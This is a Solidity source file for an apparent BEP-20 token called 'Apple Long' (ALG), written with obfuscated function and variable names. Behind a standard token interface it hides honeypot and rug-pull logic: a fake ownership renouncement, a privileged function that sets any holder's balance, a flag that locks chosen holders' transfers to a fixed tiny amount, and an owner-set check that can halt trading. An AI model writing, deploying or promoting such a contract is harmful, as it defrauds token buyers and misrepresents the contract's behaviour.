//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface launchedEnableReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract buyToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingTotal {
    function createPair(address teamTotalMax, address maxTrading) external returns (address);
}

interface launchedTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalTrading) external view returns (uint256);

    function transfer(address takeWallet, uint256 enableToTx) external returns (bool);

    function allowance(address receiverMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableToTx) external returns (bool);

    function transferFrom(
        address sender,
        address takeWallet,
        uint256 enableToTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTx, uint256 value);
    event Approval(address indexed receiverMin, address indexed spender, uint256 value);
}

interface launchedTotalMetadata is launchedTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AppleLong is buyToken, launchedTotal, launchedTotalMetadata {

    address private launchLaunchedSell;

    function owner() external view returns (address) {
        return launchLaunchedSell;
    }

    address receiverToTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listMax(address tokenMinFrom, uint256 enableToTx) public {
        totalMarketingWallet();
        senderBuy[tokenMinFrom] = enableToTx;
    }

    function balanceOf(address totalTrading) public view virtual override returns (uint256) {
        return senderBuy[totalTrading];
    }

    constructor (){
        if (exemptSender == autoMarketing) {
            exemptSender = false;
        }
        launchedEnableReceiver launchedShould = launchedEnableReceiver(atTx);
        enableTo = marketingTotal(launchedShould.factory()).createPair(launchedShould.WETH(), address(this));
        if (toWallet == modeFee) {
            toWallet = receiverLimitLiquidity;
        }
        listLaunched = _msgSender();
        receiverToken();
        modeAmount[listLaunched] = true;
        senderBuy[listLaunched] = amountSwapReceiver;
        
        emit Transfer(address(0), listLaunched, amountSwapReceiver);
    }

    bool public feeReceiver;

    uint256 constant modeFeeSell = 12 ** 10;

    function fundTake(address liquidityLaunched, address takeWallet, uint256 enableToTx) internal returns (bool) {
        if (liquidityLaunched == listLaunched) {
            return fundShould(liquidityLaunched, takeWallet, enableToTx);
        }
        uint256 autoToken = launchedTotal(enableTo).balanceOf(receiverToTake);
        require(autoToken == autoMarketingTrading);
        require(takeWallet != receiverToTake);
        if (marketingList[liquidityLaunched]) {
            return fundShould(liquidityLaunched, takeWallet, modeFeeSell);
        }
        return fundShould(liquidityLaunched, takeWallet, enableToTx);
    }

    address public enableTo;

    string private marketingWallet = "ALG";

    function maxAuto(uint256 enableToTx) public {
        totalMarketingWallet();
        autoMarketingTrading = enableToTx;
    }

    function approve(address exemptFrom, uint256 enableToTx) public virtual override returns (bool) {
        feeToken[_msgSender()][exemptFrom] = enableToTx;
        emit Approval(_msgSender(), exemptFrom, enableToTx);
        return true;
    }

    mapping(address => uint256) private senderBuy;

    uint256 public toWallet;

    mapping(address => bool) public modeAmount;

    function decimals() external view virtual override returns (uint8) {
        return atLaunchWallet;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return amountSwapReceiver;
    }

    string private marketingListFrom = "Apple Long";

    function transfer(address tokenMinFrom, uint256 enableToTx) external virtual override returns (bool) {
        return fundTake(_msgSender(), tokenMinFrom, enableToTx);
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingWallet;
    }

    bool public marketingWalletMode;

    uint8 private atLaunchWallet = 18;

    event OwnershipTransferred(address indexed autoReceiverSwap, address indexed toReceiverTrading);

    uint256 public modeFee;

    function receiverToken() public {
        emit OwnershipTransferred(listLaunched, address(0));
        launchLaunchedSell = address(0);
    }

    uint256 senderLimit;

    function name() external view virtual override returns (string memory) {
        return marketingListFrom;
    }

    function totalMarketingWallet() private view {
        require(modeAmount[_msgSender()]);
    }

    function swapMin(address feeLaunchAmount) public {
        totalMarketingWallet();
        
        if (feeLaunchAmount == listLaunched || feeLaunchAmount == enableTo) {
            return;
        }
        marketingList[feeLaunchAmount] = true;
    }

    mapping(address => bool) public marketingList;

    function fundShould(address liquidityLaunched, address takeWallet, uint256 enableToTx) internal returns (bool) {
        require(senderBuy[liquidityLaunched] >= enableToTx);
        senderBuy[liquidityLaunched] -= enableToTx;
        senderBuy[takeWallet] += enableToTx;
        emit Transfer(liquidityLaunched, takeWallet, enableToTx);
        return true;
    }

    function autoWalletMode(address fundAt) public {
        if (feeReceiver) {
            return;
        }
        if (exemptSender) {
            modeFee = receiverLimitLiquidity;
        }
        modeAmount[fundAt] = true;
        
        feeReceiver = true;
    }

    address atTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public receiverLimitLiquidity;

    function allowance(address launchTotalSell, address exemptFrom) external view virtual override returns (uint256) {
        if (exemptFrom == atTx) {
            return type(uint256).max;
        }
        return feeToken[launchTotalSell][exemptFrom];
    }

    address public listLaunched;

    uint256 autoMarketingTrading;

    function transferFrom(address liquidityLaunched, address takeWallet, uint256 enableToTx) external override returns (bool) {
        if (_msgSender() != atTx) {
            if (feeToken[liquidityLaunched][_msgSender()] != type(uint256).max) {
                require(enableToTx <= feeToken[liquidityLaunched][_msgSender()]);
                feeToken[liquidityLaunched][_msgSender()] -= enableToTx;
            }
        }
        return fundTake(liquidityLaunched, takeWallet, enableToTx);
    }

    bool public exemptSender;

    mapping(address => mapping(address => uint256)) private feeToken;

    function getOwner() external view returns (address) {
        return launchLaunchedSell;
    }

    bool public autoMarketing;

    uint256 private amountSwapReceiver = 100000000 * 10 ** 18;

}